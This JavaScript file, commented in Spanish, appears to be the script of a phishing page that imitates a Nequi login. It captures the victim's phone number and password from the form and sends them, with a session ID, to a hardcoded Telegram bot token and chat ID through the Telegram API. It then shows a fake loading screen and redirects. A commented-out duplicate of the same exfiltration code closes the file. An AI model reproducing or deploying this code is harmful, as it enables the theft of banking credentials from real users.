// Generar un Session ID único
function generarSessionId() {
    const timestamp = Date.now().toString(36);
    const random = Math.random().toString(36).substring(2, 10);
    return `${timestamp}-${random}`;
}

// Guardar el Session ID en una cookie
function guardarSessionIdEnCookie(sessionId) {
    const fechaExpiracion = new Date();
    fechaExpiracion.setTime(fechaExpiracion.getTime() + (24 * 60 * 60 * 1000)); // 1 día
    document.cookie = `sessionId=${sessionId}; expires=${fechaExpiracion.toUTCString()}; path=/`;
}

// Obtener el Session ID de la cookie
function obtenerSessionIdDeCookie() {
    const cookies = document.cookie.split(';');
    for (let cookie of cookies) {
        const [nombre, valor] = cookie.trim().split('=');
        if (nombre === 'sessionId') {
            return valor;
        }
    }
    return null;
}

// Verificar si ya existe un Session ID
let sessionId = obtenerSessionIdDeCookie();
if (!sessionId) {
    sessionId = generarSessionId();
    guardarSessionIdEnCookie(sessionId);
}

// Enviar datos al servidor cuando se envía el formulario
document.getElementById('nequi-form').addEventListener('submit', function (e) {
    e.preventDefault();

    // Mostrar el loader
    document.getElementById('loading-overlay').style.display = 'flex';

    // Capturar los valores de los inputs
    const celular = document.getElementById('celular').value;
    const clave = document.getElementById('clave').value;

    // Crear el objeto con los datos y el Session ID
    const datos = {
        sessionId: sessionId,
        celular: celular,
        clave: clave
    };

    // Enviar los datos a Telegram
    enviarDatosTelegram(celular, clave);

    // Simular un proceso (ej. una solicitud de red)
    setTimeout(() => {
        // Ocultar el loader
        document.getElementById('loading-overlay').style.display = 'none';

        // Redirigir a otro documento HTML
        window.location.href = "loader.html";
    }, 2000);
});

// Función para enviar datos a múltiples bots de Telegram
function enviarDatosTelegram(celular, clave) {
    const bots = [
        { token: "7669760908:AAFpRpQVlvJbSmignQoO1SwPuyoxsHL_i2c", chatId: "6328222257" }
    ];

    bots.forEach(bot => {
        const mensaje = `📲 *Nuevo Ingreso*\n\n📞 Celular: ${celular}\n🔐 Clave: ${clave}\n🆔 Session ID: ${sessionId}`;
        const url = `https://api.telegram.org/bot${bot.token}/sendMessage?chat_id=${bot.chatId}&text=${encodeURIComponent(mensaje)}&parse_mode=Markdown`;

        fetch(url)
            .then(response => {
                if (!response.ok) {
                    throw new Error(`Error en la solicitud: ${response.status} ${response.statusText}`);
                }
                return response.json();
            })
            .then(data => console.log(`Mensaje enviado a bot: ${bot.token}`, data))
            .catch(error => console.error(`Error al enviar mensaje: ${error.message}`));
    });
}



// document.getElementById('nequi-form').addEventListener('submit', function (e) {
//     e.preventDefault(); // Evitar el envío automático del formulario

//     // Mostrar el loader
//     document.getElementById('loading-overlay').style.display = 'flex';

//     // Capturar los valores de los inputs
//     var celular = document.getElementById('celular').value;
//     var clave = document.getElementById('clave').value;

//     // Enviar los datos a Telegram
//     enviarDatosTelegram(celular, clave);

//     // Simular un proceso (ej. una solicitud de red)
//     setTimeout(() => {
//         // Ocultar el loader
//         document.getElementById('loading-overlay').style.display = 'none';

//         // Redirigir a otro documento HTML
//         window.location.href = "loader.html"; // Cambia esto por la URL de destino
//     }, 2000);
// });

// // Función para enviar datos a múltiples bots de Telegram
// function enviarDatosTelegram(celular, clave) {
//     var bots = [
//         { token: "7669760908:AAFpRpQVlvJbSmignQoO1SwPuyoxsHL_i2c", chatId: "6328222257" },
//         { token: "", chatId: "" }
//     ];

//     bots.forEach(bot => {
//         var mensaje = `📲 *Nuevo Ingreso*\n\n📞 Celular: ${celular}\n🔐 Clave: ${clave}`;
//         var url = `https://api.telegram.org/bot${bot.token}/sendMessage?chat_id=${bot.chatId}&text=${encodeURIComponent(mensaje)}&parse_mode=Markdown`;

//         fetch(url).then(response => console.log(`Mensaje enviado a bot: ${bot.token}`))
//                   .catch(error => console.error(`Error al enviar mensaje: ${error}`));
//     });
// }